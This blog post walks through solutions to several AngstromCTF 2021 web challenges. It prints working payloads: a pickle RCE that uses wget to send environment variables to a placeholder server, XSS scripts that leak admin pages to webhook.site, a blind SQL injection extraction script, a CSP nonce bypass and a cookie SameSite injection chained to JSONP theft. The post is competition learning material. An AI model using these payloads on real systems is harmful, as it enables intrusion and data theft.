---
title: AngstromCTF Web Writeups
summary: 
date: "2021-04-11T00:20:00Z"

reading_time: true  # Show estimated reading time?
share: true  # Show social sharing links?
profile: true  # Show author profile?
comments: true  # Show comments?
# Optional header image (relative to `static/img/` folder).
header:
  caption: ""
  image: ""
---
Finally after finishing my exams , I had the opportunity to participate in the last 2 days of AngstromCTF with my team Fword and managed to solve all the web challenges except the last 3 tasks, unfortunately I didn't have the chance to try the last two ones , bad subjects at school are always keeping me from playing CTFs and learning useful stuffs :( !
However, I have really liked the web challenges especially the client side ones, we will go through all the tasks so let's begin.

## Jar ##

![TASK](https://imgur.com/JEzoi9Q.png)

This task was straightforward, as we can see in the source code it's clearly an unsafe pickle deserialization vulnerability 

```python
@app.route('/add', methods=['POST'])
def add():
        contents = request.cookies.get('contents')
        if contents: items = pickle.loads(base64.b64decode(contents))
        else: items = []
        items.append(request.form['item'])
        response = make_response(redirect('/'))
        response.set_cookie('contents', base64.b64encode(pickle.dumps(items)))
        return response
```

We can generate our payload with the following script to achieve RCE and exfiltrate the flag 

```python
import pickle,base64
class exploit(object):
        def __reduce__(self):
                import os
                return (os.system,('wget https://SERVER/?a=`env|base64|tr -d "\n"`',))
base64.b64encode(pickle.dumps(exploit()))

```

Then we only have to change **contents** cookie with our payload :D

## Sea of Quills  ##

![TASK](https://imgur.com/A8C9uwR.png)

As we can see in the source code it's an SQL injection with some filters.

```ruby

post '/quills' do
        db = SQLite3::Database.new "quills.db"
        cols = params[:cols]
        lim = params[:limit]
        off = params[:offset]

        blacklist = ["-", "/", ";", "'", "\""]

        blacklist.each { |word|
                if cols.include? word
                        return "beep boop sqli detected!"
                end
        }


        if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
                return "bad, no quills for you!"
        end

        @row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])

        p @row

        erb :specific
end
```
we can inject the following in cols part to get our flag (after performing the usual steps to find the column and table name)
```
1,flag,2 from flagtable union select 1,2,3 
```

And Bingo we got our flag 

![FLAG](https://imgur.com/RQFlr3j.png)


## nomnomnom ##

It was a client-side task, our goal is to leak the admin page's source code in order to get the flag so we have to find a way and get an XSS. Reviewing the source code we can spot a possible injection sink in the **share name** but unfortunately
the page is protected with a strict CSP , the only way to execute javascript (as far as I know) is using the nonce value which is randomly generated on every request.


```javascript
app.get('/shares/:shareName', function(req, res) {
        // TODO: better page maybe...? would attract those sweet sweet vcbucks
        if (!(req.params.shareName in shares)) {
                return res.status(400).send('hey that share doesn\'t exist... are you a time traveller :O');
        }

        const share = shares[req.params.shareName];
        const score = share.score;
        const name = share.name;
        const nonce = crypto.randomBytes(16).toString('hex');
        let extra = '';

        if (req.cookies.no_this_is_not_the_challenge_go_away === nothisisntthechallenge) {
                extra = `deletion token: <code>${process.env.FLAG}</code>`
        }

        return res.send(`
<!DOCTYPE html>
<html>
        <head>
                <meta http-equiv='Content-Security-Policy' content="script-src 'nonce-${nonce}'">
                <title>snek nomnomnom</title>
        </head>
        <body>
                ${extra}${extra ? '<br /><br />' : ''}
                <h2>snek goes <em>nomnomnom</em></h2><br />
                Check out this score of ${score}! <br />
                <a href='/'>Play!</a> <button id='reporter'>Report.</button> <br />
                <br />
                This score was set by ${name}
                <script nonce='${nonce}'>
function report() {
        fetch('/report/${req.params.shareName}', {
                method: 'POST'
        });
}

document.getElementById('reporter').onclick = () => { report() };
                </script> 

        </body>
</html>`);
});

```

The first thing I tried was using markup dangling technique in order to leak the nonce and reuse it maybe but it was not possible in this case . After some tries and fails I thought that maybe if I can abuse the 
already written nonce and somehow include it in a script tag I inject. Injecting the following payload in the share's name will lead us to use the nonce with our own src attribute 

```
<script src=http://SERVER/app.js 
```
How it's interpreted: 

![TASK](https://imgur.com/LOe0BL1.png)

And we host app.js file on our server with the following content , the bot didn't have fetch api so I used XMLHttpRequest.

```javascript
function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
httpGet("https://webhook.site/b494ae6c-c6f2-4ea2-b915-47e22ed4c076/?a="+btoa(document.body.innerHTML));

```

Finally you only have to report the share to the admin and get the beloved flag :D

## Reaction.py ##

![TASK](https://imgur.com/b674MEG.png)

We are provided with the source code of the website, it's a simple website with a register and login functionalities, after registering you will have a page where you can crete some predefined modules. This the most interesting function: 

![TASK](https://imgur.com/QZFghFT.png)

```python
def add_component(name, cfg, bucket):
    if not name or not cfg:
        return (ERR, "Missing parameters")
    if len(bucket) >= 2:
        return (ERR, "Bucket too large (our servers aren't very good :((((()")
    if len(cfg) > 250:
        return (ERR, "Config too large (our servers aren't very good :((((()")
    if name == "welcome":
        if len(bucket) > 0:
            return (ERR, "Welcomes can only go at the start")
        bucket.append(
            """
            <form action="/newcomp" method="POST">
                <input type="text" name="name" placeholder="component name">
                <input type="text" name="cfg" placeholder="component config">
                <input type="submit" value="create component">
            </form>
            <form action="/reset" method="POST">
                <p>warning: resetting components gets rid of this form for some reason</p>
                <input type="submit" value="reset components">
            </form>
            <form action="/contest" method="POST">
                <div class="g-recaptcha" data-sitekey="{}"></div>
                <input type="submit" value="submit site to contest">
            </form>
            <p>Welcome <strong>{}</strong>!</p>
            """.format(
                captcha.get("sitekey"), escape(cfg)
            ).strip()
        )
    elif name == "char_count":
        bucket.append(
            "<p>{}</p>".format(
                escape(
                    f"<strong>{len(cfg)}</strong> characters and <strong>{len(cfg.split())}</strong> words"
                )
            )
        )
    elif name == "text":
        bucket.append("<p>{}</p>".format(escape(cfg)))
    elif name == "freq":
        counts = Counter(cfg)
        (char, freq) = max(counts.items(), key=lambda x: x[1])
        bucket.append(
            "<p>All letters: {}<br>Most frequent: '{}'x{}</p>".format(
                "".join(counts), char, freq
            )
        )
    else:
        return (ERR, "Invalid component name")
    return (OK, bucket)


```

We can notice that we can only submit two modules, we have a reset feature to wipe all the created modules and all our input is well sanitized except all the letters used in **freq** module. Taking into consideration all the constraints 
we have, we can only inject two times (because of the maximum number of modules), the non sanitized input is passed to **Collectons.Counter** so every duplicated character will be removed which prevent us from injecting all the payload .

Burp request to reset the modules:

![TASK](https://imgur.com/en49sjU.png) 

I started struggling a little bit here and tried passing the component config as an array (I noticed when testing locally that when passing an array to Collections.Counter it won't remove dup chars) but it didn't lead me anywhere.

After watching some anime, I took another look at the challenge and got the idea to split my payload and inject it separately in the two modules, firstly we can inject ```<script>/*``` in the **freq** module ( Input is not sanitized so we can safely open a script tag)
and the ``` /* ``` to comment all the garbage between the two modules and then inject our second payload ```*/function r(u){var c=new XMLHttpRequest();c.withCredentials=true;c.open(`GET`,u,false);c.send(null);return c.responseText;}var b=r(`http://127.0.0.1:8080/?fakeuser=admin`);fetch(`https://SERVER/?a=`%2Bbtoa(b));// ``` in **text** module ( we have to make sure that it will not contain any characters that can be escaped ). I used the backtick instead of the quotation marks.

This is the final result after injecting:

![TASK](https://imgur.com/IO30QBL.png)

Finally to report our page to the admin we had to manually add the report form and the script tag of the recaptcha. After visiting our page we receive the source code containing the flag:

![TASK](https://imgur.com/s6TCqST.png) 

## Sea of Quills 2  ##

![TASK](https://imgur.com/RjA6RVw.png)

This was a second version of the first SQL injection task but with more strict filters, this is the most interesting part of the source code:


```ruby

post '/quills' do
        db = SQLite3::Database.new "quills.db"
        cols = params[:cols]
        lim = params[:limit]
        off = params[:offset]

        blacklist = ["-", "/", ";", "'", "\"", "flag"]

        blacklist.each { |word|
                if cols.include? word
                        return "beep boop sqli detected!"
                end
        }

        puts "select %s from quills limit %s offset %s" % [cols, lim, off]
        if cols.length > 24 || !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
                return "bad, no quills for you!"
        end

        puts "select %s from quills limit %s offset %s" % [cols, lim, off]
        @row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])


        p @row

        erb :specific
end

```

The most attentive readers may have noticed that cols parameter length is limited to 24 characters now and it can't include the word flag :( The first idea I got is to try passing an array to cols parameter in order to bypass the filters but unfortunately I couldn't get rid of the brackets that were causing an sqlite error. This is the resulting SQL query after passing **cols** as an array ( cols[]=input ):

```
select ["input"] from quills limit 10 offset 0
```
 
After some fails I remembered that regex matching in ruby can be broken using \n , I was so dumb to forget something this important. I opted to the following payload in limit parameter to perform a blind SQL injection:

```
10%0a%20and%20((select%20substr(flag,{count},1)%20from%20flagtable)%20%3d%3d%20"{sub}"%20);
```

**%0a** to break the regex and escape it , then we will iterate over all the characters of the flag , if we have a correct letter the response will contain the values passed in cols as mentioned in the picture below :

![TASK](https://imgur.com/BDSTqTQ.png) 

This is my final exploit to exfiltrate the flag char by char:

```python

import string,requests
from urllib.parse import unquote
data={"offset":"7","cols":"999999999,5,6"}
url="https://seaofquills-two.2021.chall.actf.co/quills"
chars=string.printable
flag=""
i=36
print("[+] Started")
while "}" not in flag:
        for char in chars:
                payload='10%0a%20and%20((select%20substr(flag,{count},1)%20from%20flagtable)%20%3d%3d%20"{sub}"%20);'.format(count=str(i),sub=char)
                data["limit"]=unquote(payload)
                r=requests.post(url,data=data)
                if "999999999" in r.text:
                        flag=flag+char
                        i=i+1
                        print("[+] "+flag)
                        break


```

## Spoofy ##

![TASK](https://imgur.com/QAbO9JZ.png)

We are given the source code as always ( Best thing about this CTF ), we have to pass the following check in order to get the flag.

```python

    if "X-Forwarded-For" in request.headers:
        # https://stackoverflow.com/q/18264304/
        # Some people say first ip in list, some people say last
        # I don't know who to believe
        # So just believe both
        ips: List[str] = request.headers["X-Forwarded-For"].split(", ")
        if not ips:
            return text_response("How is it even possible to have 0 IPs???", 400)
        if ips[0] != ips[-1]:
            return text_response(
                "First and last IPs disagree so I'm just going to not serve this request.",
                400,
            )
        ip: str = ips[0]
        if ip != "1.3.3.7":
            return text_response("I don't trust you >:(", 401)
        return text_response("Hello 1337 haxx0r, here's the flag! " + FLAG)
    else:
        return text_response("Please run the server through a proxy.", 400)
```

The application is hosted in Heroku , in fact heroku will append your real ip to the X-Forwarded-For header so it seems impossible to satisfy the mentioned conditions since our real ip is not 1.3.3.7 . The bypass is simple , we can pass 
the X-Forwarded-For header twice and heroku's router will append our real ip to the first one then the two headers will be concatenated :D 

![TASK](https://imgur.com/Hib9xam.png)

## Jason ##

![TASK](https://imgur.com/vXCDntA.png)

I have particularly enjoyed this challenge but I was really stupid and solved it just after the CTF ended. In fact the admin bot was using headless chrome and I was testing my exploit on firefox which had a different behaviour :( We have the source code as always , the website is simple we have a report functionality and a simple passcode keyboard. 

![TASK](https://imgur.com/bNFep2h.png)

```javascript
const jason = require('./jason')

const express = require('express')
const bodyParser = require('body-parser')
const cookieParser = require('cookie-parser')

const app = express()

function sameOrigin (req, res, next) {
        if (req.get('referer') && !req.get('referer').startsWith(process.env.URL))
                return res.sendStatus(403)
        return next()
}

app.use(bodyParser.urlencoded({ extended: false }))
app.use(cookieParser())

app.use(express.static('public'))

app.post('/passcode', function (req, res) {
        if (req.body.passcode === 'CLEAR') res.append('Set-Cookie', 'passcode=')
        else res.append('Set-Cookie', `passcode=${(req.cookies.passcode || '')+req.body.passcode}`)
        return res.redirect('/')
})

app.post('/visit', async function (req, res) {
        if (req.body.site.startsWith('http')) try {await jason.visit(req.body.site) } catch (e) {console.log(e)}
        return res.redirect('/')
})

app.get('/languages', sameOrigin, function (req, res) {
        res.jsonp({category: 'languages', items: ['C++', 'Rust', 'OCaml', 'Lisp', 'Physical touch']})
})

app.get('/friends', sameOrigin, function (req, res) {
        res.jsonp({category: 'friends', items: ['Functional programming']})
})

app.get('/flags', sameOrigin, function (req, res) {
        if (req.cookies.passcode !== process.env.PASSCODE) return res.sendStatus(403)
        res.jsonp({category: 'flags', items: [process.env.FLAG]})
})

app.listen(7331)

```

We can notice that we have to find a way to load the /flags jsonp endpoint so we have to bypass firstly the sameOrigin middleware check and find a way to send the passcode cookie in the cross origin request. The first check about sameOrigin is easy to bypass if we set 
**referrer-policy** to **no-referrer**, the problem is the second part about cookies because the default behaviour of chrome is to set the SameSite attribute to lax if no SameSite attribute is specified which prevents sending cookies in cross origin requests ( More [Details](https://www.chromium.org/updates/same-site/faq) ).
 
We can notice that we have a possible injection in  Set-Cookie response header so we can inject **;SameSite=None; Secure** in order to permit cookies to be sent in cross site requests. There is a little piece missing which is how to send the post request in order to inject the SameSite attribute,  the idea here is to opt to **Lax + POST mitigation** which enables the cookie to be sent on a top-level cross-site POST request as you can see in the link provided.

Let's recapitulate , our chain will be as following:

First we send a post request to /passcode from a top level window in order to inject **;SameSite=None; Secure** then we call script tag with a src as **/flags** and referrer-policy set to no-referrer, This was my final exploit:

```python

from flask import Flask
import time

app = Flask(__name__)

@app.route('/delay')
def delay():
        time.sleep(9)
        return "zeu"

@app.route('/form')
def form():
        return """
<html>
<body>
<form method='post' id='hack' action='https://jason.2021.chall.actf.co/passcode'>
<input type='text' name='passcode' value=';SameSite=None; Secure'>
</form>
<script>
document.getElementById('hack').submit();
</script>
</body>
</html>
"""

@app.route('/flag')
def flag():
        return """
<html>
<meta name='referrer' content='no-referrer'> 
<body>
<script>
function load(data){
fetch("http://SERVER?a="+data.items.map(i => i).join(''));
}
var s=document.createElement("script");
s.src="https://jason.2021.chall.actf.co/flags?callback=load";
document.body.appendChild(s);
</script>
</body>
</html>

"""

@app.route('/')
def index():
        return """
<html>
<body>
<img src="/delay"/>
<script>
var w=window.open("/form","win");
window.open("/flag","hah");
</script>
</body> 
</html>
"""
if __name__=="__main__":
        app.run(port=1234, host="0.0.0.0")


```

And bingo we get our flag :

![TASK](https://imgur.com/xnOHIJp.png)


Unfortunately I couldn't try the last two challenges because of the lack of time ( school is the worst ) :'( I have really enjoyed the tasks especially the client side ones so kudos to the authors for these well designed challenges ! I hope you learned from the writeup , feel free to dm me on twitter if you have any questions!
